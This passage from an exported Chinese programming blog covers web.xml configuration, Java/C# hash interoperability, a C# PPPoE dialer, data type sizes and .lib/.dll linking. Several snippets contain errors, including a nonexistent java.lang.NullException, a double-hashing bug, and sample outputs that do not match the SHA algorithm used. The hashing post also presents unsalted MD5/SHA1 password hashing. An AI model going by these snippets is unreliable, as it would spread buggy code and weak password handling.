&lt;filter-name&gt;hibernateFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.orm.hibernate4.support.OpenSessionInViewFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;sessionFactoryBeanName&lt;/param-name&gt; &lt;param-value&gt;mySessionFactory&lt;/param-value&gt; &lt;/init-param&gt; &lt;/filter&gt; &lt;!-- 配置struts2 --&gt; &lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter&gt; &lt;filter-name&gt;struts2_1&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;!-- --&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;hibernateFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts-cleanup&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;sitemesh3&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts2_1&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt;&lt;/web-app&gt; 第一行就跟html的&lt;!Doctype&gt;作用差不多。1、web.xml文件的作用web.xml主要用来配置Filter、Listener、Servlet等。但是要说明的是web.xml并不是必须的，一个web工程可以没有web.xml2、web容器的加载过程web容器的加载顺序是:ServletContext-&gt;context-param-&gt;listener-&gt;filter-&gt;servlet。在web.xml文件中最好按照这种顺序配置这些元素。3、web容器的启动过程启动一个web项目的时候，web容器会去读取它的配置文件web.xml，读取listener和context-param两个结点。紧接着，容器创建一个ServletContext上下文，这个web项目的所有部分都将共享这个上下文。容器将context-param转换为键值对，并交给servletContext。容器创建listener中的类实例，创建监听器。 web-app根元素web.xml的模式文件是由Sun公司定义的，每个web.xml文件的根元素中，都必须标明这个 web.xml使用的是哪个模式文件。其它的元素都放在之中，是根节点。12345&lt;web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"&gt;&lt;/web-app&gt; icon web应用图标1234&lt;icon&gt; &lt;small-icon&gt;/images/app_small.gif&lt;/small-icon&gt; &lt;large-icon&gt;/images/app_large.gif&lt;/large-icon&gt;&lt;/icon&gt; display-name web应用名称1&lt;display-name&gt;Tomcat Example&lt;/display-name&gt; discription web应用描述1&lt;discription&gt;Tomcat Example servlets and jsp pages&lt;/discription&gt; context-param 上下文参数 声明应用范围内的初始化参数。它用于向 ServletContext提供键值对，即应用程序上下文信息。我们的listener, filter等在初始化时会用到这些上下文中的信息。在servlet里面可以通过getServletContext().getInitParameter(“context/param”)得到。12345&lt;context-param&gt; &lt;param-name&gt;ContextParameter&lt;/para-name&gt; &lt;param-value&gt;test&lt;/param-value&gt; &lt;description&gt;It is a test parameter.&lt;/description&gt;&lt;/context-param&gt; filter过滤器123456789101112&lt;filter&gt; &lt;filter-name&gt;setCharacterEncoding&lt;/filter-name&gt; &lt;filter-class&gt;com.myTest.setCharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;UTF-8&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;setCharacterEncoding&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; listener监听器123&lt;listener&gt; &lt;listener-class&gt;com.listener.SessionListener&lt;/listener-class&gt; &lt;/listener&gt; servletservlet 用来声明一个servlet的数据，主要有以下子元素：servlet-name 指定servlet的名称servlet-class 指定servlet的类名称jsp-file 指定web站台中的某个JSP网页的完整路径init-param 用来定义参数，可有多个init-param。load-on-startup 当值为正数或零时，从小到大加载。否则第一次访问时加载。servlet-mapping 用来定义servlet所对应的URL，包含两个子元素servlet-name 指定servlet的名称url-pattern 指定servlet所对应的URL 1234567891011121314151617181920212223242526&lt;!-- 基本配置 --&gt;&lt;servlet&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;servlet-class&gt;SnoopServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;url-pattern&gt;/snoop&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;!-- 高级配置 --&gt;&lt;servlet&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;servlet-class&gt;SnoopServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;foo&lt;/param-name&gt; &lt;param-value&gt;bar&lt;/param-value&gt; &lt;/init-param&gt; &lt;run-as&gt; &lt;description&gt;Security role for anonymous access&lt;/description&gt; &lt;role-name&gt;tomcat&lt;/role-name&gt; &lt;/run-as&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;url-pattern&gt;/snoop&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; session-config会话超时配置123&lt;session-config&gt; &lt;session-timeout&gt;120&lt;/session-timeout&gt;&lt;!-- 单位为分钟 --&gt;&lt;/session-config&gt; mime-mapping1234&lt;mime-mapping&gt; &lt;extension&gt;htm&lt;/extension&gt; &lt;mime-type&gt;text/html&lt;/mime-type&gt;&lt;/mime-mapping&gt; welcome-file-list欢迎文件页1234&lt;welcome-file-list&gt; &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt; &lt;welcome-file&gt;index.html&lt;/welcome-file&gt;&lt;/welcome-file-list&gt; error-page错误页面12345678910&lt;!-- 1、通过错误码来配置error-page。当系统发生×××错误时，跳转到错误处理页面。 --&gt;&lt;error-page&gt; &lt;error-code&gt;404&lt;/error-code&gt; &lt;location&gt;/NotFound.jsp&lt;/location&gt;&lt;/error-page&gt;&lt;!-- 2、通过异常的类型配置error-page。（即空指针异常）时，跳转到错误处理页面。 --&gt;&lt;error-page&gt; &lt;exception-type&gt;java.lang.NullException&lt;/exception-type&gt; &lt;location&gt;/error.jsp&lt;/location&gt;&lt;/error-page&gt; jsp-config 设置jsp12345678910&lt;jsp-config&gt; 包括 &lt;taglib&gt;和&lt;jsp-property-group&gt;两个子元素。其中&lt;taglib&gt;元素在JSP1.2时就已经存在；而&lt;jsp-property-group&gt; 是JSP 2.0 新增的元素。&lt;jsp-property-group&gt; 元素主要有八个子元素，它们分别为：&lt;description&gt; 设定的说明 &lt;display-name&gt; 设定名称 &lt;url-pattern&gt; 设定值所影响的范围，如： /CH2 或 /*.jsp&lt;el-ignored&gt; 若为 true，表示不支持 EL 语法 &lt;scripting-invalid&gt; 若为 true，表示不支持 &lt;% scripting %&gt;语法 &lt;page-encoding&gt; 设定 JSP 网页的编码 &lt;include-prelude&gt; 设置 JSP 网页的抬头，扩展名为 .jspf&lt;include-coda&gt; 设置 JSP 网页的结尾，扩展名为 .jspf 12345678910111213141516&lt;jsp-config&gt; &lt;taglib&gt; &lt;taglib-uri&gt;Taglib&lt;/taglib-uri&gt; &lt;taglib-location&gt;/WEB-INF/tlds/MyTaglib.tld&lt;/taglib-location&gt; &lt;/taglib&gt; &lt;jsp-property-group&gt; &lt;description&gt;Special property group for JSP Configuration JSP example.&lt;/description&gt; &lt;display-name&gt;JSPConfiguration&lt;/display-name&gt; &lt;url-pattern&gt;/jsp/* &lt;/url-pattern&gt; &lt;el-ignored&gt;true&lt;/el-ignored&gt; &lt;page-encoding&gt;GB2312&lt;/page-encoding&gt; &lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt; &lt;include-prelude&gt;/include/prelude.jspf&lt;/include-prelude&gt; &lt;include-coda&gt;/include/coda.jspf&lt;/include-coda&gt; &lt;/jsp-property-group&gt;&lt;/jsp-config&gt;]]></content>
      <categories>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java和C#摘要算法实现]]></title>
    <url>%2F2017%2F06%2F05%2Fthird%2F</url>
    <content type="text"><![CDATA[由来对于Passport,微软解释道:Passport 是一种服务。利用该服务，用户可以通过只创建一个登录名和密码就能登录到 Microsoft Passport Network 站点和服务。通常来讲，当您在 Passport Network 上创建帐户时，Passport 只收集和存储用户名（通常是您的电子邮件地址）和密码，以创建您的凭据。如果您通过移动电话访问 Passport 服务，我们会要求您提供您的电话号码用作登录名，并要求您创建一个 PIN 用作您的密码。在注册时，Passport 将一个 64 位数字的唯一标识符 (ID) 与每个 Passport Network 帐户关联。当您选择登录到 Passport Network 站点时，Passport 将此独一无二的标识符加密并发送到该站点，便于该站点用其判断从一个登录会话转到另一个会话的人员是否是同一个人。 微软的摘要算法与Passport类似的想法,两年前,也使用了类似方法来提供统一系统登录入口,这个服务是由Java语言实现的,而系统中有些部分是用.Net技术实现,因此要保证这个服务具有良好的互操作性.在保证了服务实现遵循WS-I协议标准之后,遇到了如下问题:因密码都经过了哈希处理,java中的哈希和.Net中的哈希对于相同的串产生了不同的输出.这个问题令人印象深刻,所以把它记录了下来.今天把它贴出来供有需要的人们参考.以C#为例,首先看看.Net的哈希算法实现,HashAlgorithm 类,声明为public abstract class HashAlgorithm : ICryptoTransform, IDisposable表示所有加密哈希算法实现均必须从中派生的基类,目前,微软提供了派生自这个类的类包括: System.Security.Cryptography.KeyedHashAlgorithm System.Security.Cryptography.MD5 System.Security.Cryptography.SHA1 System.Security.Cryptography.SHA256 System.Security.Cryptography.SHA384 System.Security.Cryptography.SHA512 它们都是抽象类,申明为:public abstract class MD5 : HashAlgorithm,其它依此类推. 其中,KeyedHashAlgorithm为键控哈希算法的抽象类,微软提供了两个实现: System.Security.Cryptography.HMACSHA1 System.Security.Cryptography.MACTripleDES 键控哈希算法是依赖于密钥的单向哈希函数，用作消息验证代码。只有知道密钥的人才能验证哈希值。加密哈希算法提供没有机密的真实性。 最后的实现,微软称为加密服务提供程序(CSP),例如MD5的CSP是MD5CryptoServiceProvider类. 到这里,可以认为HashAlgorithm类及其实现形成了策略模式,加密服务提供者提供服务和修改服务不会影响客户代码. 对于使用,有两种方式,一种是可直接创建的MD5 类的实例.如 MD5 md5=new MD5CryptoServiceProvider(); byte[] hashvalue=md5.ComputeHash(data2ToHash); 另一种是利用CryptoConfig类访问加密配置信息来提供相应的算法.它支持很多加密算法: SHA,MD5,SHA256,SHA384,SHA512,RSA,DSA,DES,TripleDES,RC2,Rijndael. 例如由加密配置系统返回的MD5 实例: byte[] hashvalue1 = ((HashAlgorithm) CryptoConfig.CreateFromName(“MD5”)).ComputeHash(data1ToHash); 到这里CryptoConfig类和HashAlgorithm类及其实现形成了工厂方法模式,而CryptoConfig就是一个抽象工厂,用于创建不同的加密算法对象,客户代码通过CryptoConfig访问加密算法实现. Java的哈希算法实现java.security.MessageDigest是一个工厂类,使用工厂方法getInstance即可获得不同的加密算法,并通过MessageDigest访问,例如: MessageDigest ha=MessageDigest.getInstance(“SHA”); MessageDigest ha=MessageDigest.getInstance(“MD5”); 具体实现由算法服务提供者提供.在使用方面两种环境都比较简洁. 测试两种环境下的摘要算法Java代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package security;import java.security.MessageDigest;import java.io.UnsupportedEncodingException;import java.security.NoSuchAlgorithmException;/** * * &lt;p&gt;Title: &lt;/p&gt; * * &lt;p&gt;Description: * 用于同C#语言实现的摘要算法对比. * &lt;/p&gt; * * &lt;p&gt;Copyright: Copyright (c) 2005&lt;/p&gt; * * &lt;p&gt;Company: &lt;/p&gt; * * @author not attributable * @version 1.0 */public class HACompareJC &#123; public HACompareJC() &#123; &#125; public static void main(String[] args) throws Exception &#123; HACompareJC hacomparejc = new HACompareJC(); String data = "锐意"; String ha = "SHA"; System.out.println(hacomparejc.testHA1(data, ha)); System.out.println(hacomparejc.testHA2(data, ha)); System.out.println(hacomparejc.testHA3(data, ha)); &#125; /** * ??&gt;&#125;G?y????V= * @param data String * @throws Exception */ public String testHA1(String data, String ha) throws Exception &#123; byte[] buffer = data.getBytes("UTF8"); MessageDigest messageDigest = MessageDigest.getInstance(ha); messageDigest.update(buffer); String s = new String(messageDigest.digest(), "UTF8"); //System.out.println(s); return new String(s); &#125; /** * 对哈希值使用base64编码. * sxjuhT59R/2peb2UtspWPQ== * @param data String * @throws Exception */ public String testHA2(String data, String ha) throws Exception &#123; byte[] buffer = data.getBytes("UTF8"); MessageDigest messageDigest = MessageDigest.getInstance(ha); messageDigest.update(buffer); buffer = messageDigest.digest(); String s = new sun.misc.BASE64Encoder().encode(buffer); //System.out.println(s); return s; &#125; C#代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126/** * 这个是和C#中的处理结果是相同的. * 4b-5d-11-c9-96-2d-62-92-b7-9b-60-e3-c9-a4-47-5c * @param data String * @return String */ public String testHA3(String data, String ha) &#123; MessageDigest m = null; try &#123; m = MessageDigest.getInstance(ha); m.update(data.getBytes("gb2312")); &#125; catch (NoSuchAlgorithmException ex1) &#123; &#125; catch (UnsupportedEncodingException ex) &#123; &#125; return toHex(m.digest()); &#125; /** * 把传来的字节数组取底8位转换到十六进制表示的字符串,并返回. * @param buffer byte[] * @return String */ private String toHex(byte[] buffer) &#123; String result = ""; for (int i = 0; i &lt; buffer.length; i++) &#123; result += Integer.toHexString( (0x000000ff &amp; buffer[i]) | 0xffffff00).substring(6) + "-"; &#125; return result.substring(0, result.length() - 1); &#125;&#125;C#代码:using System;using System.IO ;using System.Security.Cryptography;using System.Text ;using System.ClassLibrary ;namespace endecrypt&#123; /// &lt;summary&gt; /// HACompareJC 的摘要说明。 /// 用于同java语言实现的摘要算法对比. /// &lt;/summary&gt; public class HACompareJC &#123; public HACompareJC() &#123; &#125; /// &lt;summary&gt; /// .% H]+4TW2&amp; /// &lt;/summary&gt; /// &lt;param name="data"&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static string testHA1(string data,string am) &#123; byte[] buffer=Encoding.UTF8.GetBytes(data); //MD5 ha=new System.Security.Cryptography.MD5CryptoServiceProvider(); HashAlgorithm ha=(HashAlgorithm) CryptoConfig.CreateFromName(am.ToUpper()); buffer=ha.ComputeHash(buffer); return Encoding.UTF8.GetString(ha.ComputeHash(buffer)); &#125; /// &lt;summary&gt; /// 对哈希值使用base64编码. /// sxjuhT59R/2peb2UtspWPQ== /// &lt;/summary&gt; /// &lt;param name="data"&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static string testHA2(string data,string am) &#123; byte[] buffer=Encoding.UTF8.GetBytes(data); //MD5 ha=new System.Security.Cryptography.MD5CryptoServiceProvider(); HashAlgorithm ha=(HashAlgorithm) CryptoConfig.CreateFromName(am.ToUpper()); buffer=ha.ComputeHash(buffer); return Convert.ToBase64String (buffer); &#125; /// &lt;summary&gt; /// 4b-5d-11-c9-96-2d-62-92-b7-9b-60-e3-c9-a4-47-5c /// &lt;/summary&gt; /// &lt;param name="data"&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static string testHA3(string data,string am) &#123; Encoding encode=Encoding.GetEncoding("gb2312"); byte[] buffer=encode.GetBytes(data); //MD5 ha=new System.Security.Cryptography.MD5CryptoServiceProvider(); HashAlgorithm ha=(HashAlgorithm) CryptoConfig.CreateFromName(am.ToUpper()); buffer=ha.ComputeHash(buffer); return toHex(buffer); &#125; /// &lt;summary&gt; /// 把传来的字节数组取底8位转换到十六进制表示的字符串,并返回. /// &lt;/summary&gt; /// &lt;param name="buffer"&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; private static string toHex(byte[] buffer) &#123; String result = ""; for (int i = 0; i &lt; buffer.Length; i++) &#123; //result += Integer.toHexString((0x000000ff &amp; buffer[i])|0xffffff00).substring(6) + "-"; uint tm=UInt32.Parse(Convert.ToString((0x000000ff &amp; buffer[i])|0xffffff00)); result +=tm.ToString("x").Substring(6)+"-"; &#125; return result.Substring(0, result.Length - 1); &#125; public static void Main() &#123; string data="锐意"; string ha="sHA1"; string tm=HACompareJC.testHA1(data,ha); log.logs(tm); tm=HACompareJC.testHA2(data,ha); log.logs(tm); tm=HACompareJC.testHA3(data,ha); log.logs(tm); &#125; &#125;&#125; 通过在网络中传输到客户端的密码哈希值,同在内存中比较由登录用户提供的口令哈希值(或者是由在本地的系统将口令计算为哈希值,实际上那个系统就是采用了这种方式,才引出这个问题)来确定是否允许该用户进入系统]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于csharp的PPPoE连接]]></title>
    <url>%2F2017%2F06%2F05%2Fforth%2F</url>
    <content type="text"><![CDATA[第一步利用Nuget程序包管理下载DotRas for Win7或者DotRas for Win8看你的生产环境 第二步在你的类中创建一个用法，用于创建一个新的PPPoE连接123456789101112131415161718192021222324252627282930313233/// &lt;summary&gt; /// 创建或更新一个PPPOE连接(指定PPPOE名称) /// &lt;/summary&gt; public void CreateOrUpdatePPPOE(string updatePPPOEname) &#123; RasDialer dialer = new RasDialer(); RasPhoneBook allUsersPhoneBook = new RasPhoneBook(); string path = RasPhoneBook.GetPhoneBookPath(RasPhoneBookType.AllUsers); allUsersPhoneBook.Open(path); // 如果已经该名称的PPPOE已经存在，则更新这个PPPOE服务器地址 if (allUsersPhoneBook.Entries.Contains(updatePPPOEname)) &#123; allUsersPhoneBook.Entries[updatePPPOEname].PhoneNumber = " "; // 不管当前PPPOE是否连接，服务器地址的更新总能成功，如果正在连接，则需要PPPOE重启后才能起作用 allUsersPhoneBook.Entries[updatePPPOEname].Update(); &#125; // 创建一个新PPPOE else &#123; string adds = string.Empty; ReadOnlyCollection&lt;RasDevice&gt; readOnlyCollection = RasDevice.GetDevices();// foreach (var col in readOnlyCollection)// &#123;// adds += col.Name + ":" + col.DeviceType.ToString() + "|||";// &#125;// _log.Info("Devices are : " + adds); // Find the device that will be used to dial the connection. RasDevice device = RasDevice.GetDevices().Where(o =&gt; o.DeviceType == RasDeviceType.PPPoE).First(); RasEntry entry = RasEntry.CreateBroadbandEntry(updatePPPOEname, device); //建立宽带连接Entry entry.PhoneNumber = " "; allUsersPhoneBook.Entries.Add(entry); &#125; &#125; 第三步在同样的类下，创建连接方法12345678910111213141516171819202122232425262728public void Connect(string Connection) &#123; try &#123; CreateOrUpdatePPPOE(Connection); RasDialer dialer = new RasDialer(); dialer.EntryName = Connection; dialer.PhoneNumber = " "; dialer.AllowUseStoredCredentials = true; dialer.PhoneBookPath = RasPhoneBook.GetPhoneBookPath(RasPhoneBookType.AllUsers); dialer.Credentials = new NetworkCredential("username", "password"); dialer.Timeout = 1000; RasHandle myras = dialer.Dial(); while (myras.IsInvalid) &#123; Thread.Sleep(1000); myras = dialer.Dial(); &#125; if (!myras.IsInvalid) &#123; _log.Info("RasDialer Success! " + Convert.ToString(DateTime.Now)); &#125; &#125; catch (Exception ex) &#123; _log.Info("RasDialer error! " + Convert.ToString(DateTime.Now) + Connection + " error is :: " + ex.ToString()); &#125; &#125;]]></content>
      <categories>
        <category>csharp</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C、C++和Java中各种数据类型的长度]]></title>
    <url>%2F2017%2F06%2F05%2Fsecond%2F</url>
    <content type="text"><![CDATA[C 32位机器 64位机器 char 1 1 int 4 4 long 4 8 float 4 4 double 8 8 char* 4 8 C++int型字长问题：① C/C++规定int字长和机器字长相同；② 操作系统字长和机器字长未必一致；③ 编译器根据操作系统字长来定义int字长；由上面三点可知，在一些没有操作系统的嵌入式计算机系统上，int的长度与处理器字长一致；有操作系统时，操作系统的字长与处理器的字长不一定一致，此时编译器根据操作系统的字长来定义int字长:”比如你在64位机器上运行DOS16系统，那么所有for dos16的C/C++编译器中int都是16位的;在64位机器上运行win32系统，那么所有for win32的C/C++编译器中int都是32位的”常见基本类型的字节大小32位操作系统char ：1个字节(固定)(即指针变量): 4个字节(32位机的寻址空间是4个字节。同理64位编译器)(变化)short int : 2个字节(固定)int： 4个字节(固定)unsigned int : 4个字节(固定)float: 4个字节(固定)double: 8个字节(固定)long: 4个字节unsigned long: 4个字节(变化,其实就是寻址控件的地址长度数值)long long: 8个字节(固定)64位操作系统char ：1个字节(固定) (即指针变量): 8个字节short int : 2个字节(固定)int： 4个字节(固定)unsigned int : 4个字节(固定)float: 4个字节(固定)double: 8个字节(固定)long: 8个字节unsigned long: 8个字节(变化其实就是寻址控件的地址长度数值)long long: 8个字节(固定)除了与long随操作系统子长变化而变化外，其他的都固定不变(32位和64相比)bool 1个字节 char 1个字节 int 4个字节 float 4个字节 doubl 8个字节 long long 8个字节 Java1.在C++中，char是基础数据类型，8位，1个字节。byte不是基础数据类型，一般是typedef unsigned char byte;这样子的，也就是说，byte其实是unsigned char类型，那么也是8位，1个字节。不同的是，char可以表示的范围是-128-127，而byte可以表示的范围是0-255。2.在Java中在java中，char和byte都是基础数据类型，其中的byte和C++中的char类型是一样的，8位，1个字节，-128-127。但是，char类型，是16位，2个字节，’\u0000’-‘\uFFFF’。为什么java里的char是2个字节？3.因为java内部都是用unicode的，所以java其实是支持中文变量名的，比如string 世界 = “我的世界”;这样的语句是可以通过的。4.补充：C++中，某些数据占多少位，多少字节，是与机器操作系统，硬件，有关系的。而java中，是与操作系统，硬件无关的，因为java是运行在虚拟机上的，所以数据大小都是固定的。java中的long是固定8字节，64位；int是4字节，32位]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[.lib和.dll的区别]]></title>
    <url>%2F2017%2F06%2F05%2Ffirst%2F</url>
    <content type="text"><![CDATA[根本区别(1)lib是编译时需要的，dll是运行时需要的。如果要完成源代码的编译，有lib就够了。如果也使动态连接的程序运行起来，有dll就够了。在开发和调试阶段，当然最好都有。(2)一般的动态库程序有lib文件和dll文件。lib文件是必须在编译期就连接到应用程序中的，而dll文件是运行期才会被调用的。如果有dll文件，那么对应的lib文件一般是一些索引信息，具体的实现都在dll文件中。如果只有lib文件，那么这个lib文件是静态编译出来的，索引和实现都在其中。静态编译的lib文件有好处:给用户安装时就不需要在挂动态库了。但也有缺点，就是导致应用程序比较大，而且失去了动态库的灵活性，在版本升级时，同时要发布新的应用程序才行。(3)在动态库的情况下，有两个文件，一个是引入库文件，一个是DLL文件，引入库文件包含被DLL导出的函数的名称和位置，DLL包含实际的函数和数据，应用程序使用LIB文件链接到所需要使用的DLL文件，库中的函数和数据并不复制到可执行文件中，因此在应用程序的可执行文件中，存放的不是被调用的函数代码，而是DLL中所要调用的函数的内存地址，这样当一个或多个应用程序运行时再把程序代码和被调用的函数代码链接起来，从而节省了内存资源。从上面的说明可以看出，DLL和LIB文件必须随应用程序一起发行，否则应用程序将会产生错误。 开发和使用dll需注意三种文件1、 dll头文件 它是指dll中说明输出的类或符号原型或数据结构的.h文件。当其它应用程序调用dll时，需要将该文件包含入应用程序的源文件中。 2、 dll的引入库文件 它是dll在编译、链接成功后生成的文件。主要作用是当其它应用程序调用dll时，需要将该文件引入应用程序。否则，dll无法引入。 3、 dll文件(.dll) 它是应用程序调用dll运行时，真正的可执行文件。dll应用在编译、链接成功后，.dll文件即存在。开发成功后的应用程序在发布时，只需要有.exe文件和.dll文件，不必有.lib文件和dll头文件。动态链接库 (DLL) 是作为共享函数库的可执行文件。动态链接提供了一种方法，使进程可以调用不属于其可执行代码的函数。函数的可执行代码位于一个 DLL 中，该 DLL 包含一个或多个已被编译、链接并与使用它们的进程分开存储的函数。DLL 还有助于共享数据和资源。多个应用程序可同时访问内存中单个 DLL 副本的内容。动态链接与静态链接的不同之处在于：动态链接允许可执行模块（.dll 文件或 .exe 文件）仅包含在运行时定位 DLL 函数的可执行代码所需的信息。在静态链接中，链接器从静态链接库获取所有被引用的函数，并将库同代码一起放到可执行文件中。使用动态链接代替静态链接有若干优点。DLL 节省内存，减少交换操作，节省磁盘空间，更易于升级，提供售后支持，提供扩展 MFC 库类的机制，支持多语言程序，并使国际版本的创建轻松完成。lib与dll文件最大区别在调用方面dll可以静态陷入lib与DLL从这一章起，我讲述的内容将特定于windows平台。其实这篇文章也可看作是我在windows下的开发经验总结，因为以后我决定转unix了。前面有一章说编译与链接的，说得很简略，其实应该放到这一章一块儿来说的。许多单讲C++的书其实都过于学院派，对于真实的工作环境，上百个源文件怎么结合起来，几乎没有提及。我引导读者一步步看看lib与DLL是怎么回事。一个最简单的C++程序，只需要一个源文件，这个源文件包含了如下语句int main(){return 0;}自然，这个程序什么也不做。当需程序需要做事情时，我们会把越来越多的语句添加到源文件中，例如，我们会开始在main函数中添加代码：123456#include &lt;stdio.h&gt; int main() &#123; printf("Hello World!\n"); return 0; &#125; 由于人的智力水平的限制，当一个函数中包含了太多的语句时，便不太容易被理解，这时候开始需要子函数：12345678910#include &lt;stdio.h&gt; void ShowHello() &#123; printf("Hello World!\n"); &#125; int main() &#123; ShowHello(); return 0; &#125; 同样的道理，一个源文件中包含了太多的函数，同样不好理解，人们开始分多个源文件了12345678910111213// main.cpp void ShowHello();//[1] int main() &#123; ShowHello(); return 0; &#125; // hello.cpp #include &lt;stdio.h&gt; void ShowHello() &#123; printf("Hello World!\n"); &#125; 将这两个文件加入到一个VC工程中，它们会被分别编译，最后链接在一起。在VC编译器的输出窗口，你可以看到如下信息——————–Configuration: hello - Win32 Debug——————–Compiling…main.cpphello.cppLinking…hello.exe - 0 error(s), 0 warning(s)这展示了它们的编译链接过程。接下来，大家就算不知道也该猜到，当一个工程中有太多的源文件时，它也不好理解，于是，人们想到了一种手段：将一部分源文件预先编译成库文件，也即lib文件，当要使用其中的函数时，只需要链接lib文件就可以了，而不用再理会最初的源文件。在VC中新建一个static library类型的工程，加入hello.cpp文件，然后编译，就生成了lib文件，假设文件名为hello.lib。别的工程要使用这个lib有两种方式：1 在工程选项-〉link-〉Object/Library Module中加入hello.lib2 可以在源代码中加入一行指令1234567891011121314151617181920212223242526272829303132333435#pragma comment(lib, "hello.lib")``` 注意这个不是C++语言的一部分，而是编译器的预处理指令，用于通知编译器需要链接hello.lib 根据个人爱好任意使用一种方式既可。 这种lib文件的格式可以简单的介绍一下，它实际上是任意个obj文件的集合。obj文件则是cpp文件编译生成的，在本例中，lib文件只包含了一个obj文件，如果有多个cpp文件则会编译生成多个obj文件，从而生成的lib文件中也包含了多个obj，注意，这里仅仅是集合而已，不涉及到link，所以，在编译这种静态库工程时，你根本不会遇到链接错误。即使有错，错误也只会在使用这个lib的EXE或者DLL工程中暴露出来。 关于静态lib，就只有这么多内容了，真的很简单，现在我们介绍另外一种类型的lib，它不是obj文件的集合，即里面不含有实际的实现，它只是提供动态链接到DLL所需要的信息。这种lib可以在编译一个DLL工程时由编译器生成。涉及到DLL，问题开始复杂起来，我不指望在本文中能把DLL的原理说清楚，这不是本文的目标，我介绍操作层面的东西。 简单的说，一个DLL工程和一个EXE工程的差别有两点： 1 EXE的入口函数是main或者WinMain，而DLL的入口函数是DllMain 2 EXE的入口函数标志着一段处理流程的开始，函数退出后，流程处理就结束了，而DLL的入口函数对系统来说，只是路过，加载DLL的时候路过一次，卸载DLL的时候又路过一次[2]，你可以在DLL入口函数中做流程处理，但这通常不是DLL的目的，DLL的目的是要导出函数供其它DLL或EXE使用。你可以把DLL和EXE的关系理解成前面的main.cpp和hello.cpp的关系，有类似，实现手段不同罢了。 先看如何写一个DLL以及如何导出函数，读者应该先尝试用VC创建一个新的动态链接库工程，创建时选项不选空工程就可以了，这样你能得到一个示例，以便开始在这个例子基础上工作。 看看你创建的例子中的头文件有类似这样的语句： ``` C#ifdef DLL_EXPORTS #define DLL_API __declspec(dllexport) #else #define DLL_API __declspec(dllimport) #endif``` 这就是函数的导出与使用导出函数的全部奥妙了。你的DLL工程已经在工程设置中定义了一个宏DLL_EXPORTS，因此你的函数声明只要前面加DLL_API就表示把它导出，而DLL的使用者由于没有定义这个宏，所以它包含这个头文件时把你的函数看作导入的。通过模仿这个例子，你就可以写一系列的标记为导出的函数了。 导出函数还有另一种方法，是使用DEF文件，DEF文件的作用，在现在来说只是起到限定导出函数名字的作用，这里，我们要引出第二种[4]使用DLL的方法：称为显示加载，通过Windows API的LoadLibrary和GetProcAddress这两个函数来实现[5]，这里GetProcAddress的参数需要一个字符串形式的函数名称，如果DLL工程中没有使用DEF文件，那么很可能你要使用非常奇怪的函数名称（形如：?fnDll@@YAHXZ）才能正确调用，这是因为C++中的函数重载机制把函数名字重新编码了，如果使用DEF文件，你可以显式指定没编码前的函数名。 